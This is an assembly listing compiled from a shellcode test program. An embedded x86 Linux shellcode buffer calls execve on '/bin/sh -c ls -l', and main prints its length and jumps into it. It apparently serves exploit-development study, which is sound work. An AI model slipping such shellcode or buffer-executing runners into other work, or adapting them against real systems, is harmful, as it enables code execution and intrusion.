	.file	"shellcode.c"
	.globl	buf
	.data
	.align 32
	.type	buf, @object
	.size	buf, 42
buf:
	.string	"j\013X\231Rfh-c\211\347h/sh"
	.string	"h/bin\211\343R\350\006"
	.string	""
	.string	""
	.string	"ls -l"
	.string	"WS\211\341\315\200"
	.section	.rodata
.LC0:
	.string	"Shellcode Length:  %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	pushl	%edi
	andl	$-16, %esp
	subl	$48, %esp
	movl	$buf, %eax
	movl	$-1, 28(%esp)
	movl	%eax, %edx
	movl	$0, %eax
	movl	28(%esp), %ecx
	movl	%edx, %edi
	.cfi_offset 7, -12
	repnz scasb
	movl	%ecx, %eax
	notl	%eax
	leal	-1(%eax), %edx
	movl	$.LC0, %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	printf
	movl	$buf, 44(%esp)
	movl	44(%esp), %eax
	call	*%eax
	movl	-4(%ebp), %edi
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	.cfi_restore 7
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3"
	.section	.note.GNU-stack,"",@progbits
